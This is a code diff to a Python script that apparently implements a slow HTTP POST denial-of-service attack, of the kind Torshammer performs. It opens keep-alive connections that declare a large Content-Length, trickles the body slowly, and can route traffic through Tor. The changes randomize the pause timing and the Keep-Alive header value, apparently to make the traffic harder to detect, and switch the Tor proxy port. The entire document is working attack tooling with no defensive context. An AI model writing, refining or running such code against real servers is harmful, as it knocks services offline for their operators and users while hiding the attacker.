@@ -75,17 +75,17 @@ class httpPost(Thread):
         self.tor = tor
         self.running = True
 		
-    def _send_http_post(self, pause=7):
+    def _send_http_post(self, pause=random.randint(5,10)): 
         global stop_now
 
         self.socks.send("POST / HTTP/1.1\r\n"
                         "Host: %s\r\n"
                         "User-Agent: %s\r\n"
                         "Connection: keep-alive\r\n"
-                        "Keep-Alive: 894\r\n"
+                        "Keep-Alive: %s\r\n" 
                         "Content-Length: 99768\r\n"
                         "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
-                        (self.host, random.choice(useragents)))
+                        (self.host, random.choice(useragents), random.randint(300, 894)))
 
         for i in range(0, 9999):
             if stop_now:
@@ -103,7 +103,7 @@ class httpPost(Thread):
             while self.running:
                 try:
                     if self.tor:     
-						self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
+						self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9150)
                     self.socks.connect((self.host, self.port))
                     print term.BOL+term.UP+term.CLEAR_EOL+"Connected to host..."+ term.NORMAL
                     break
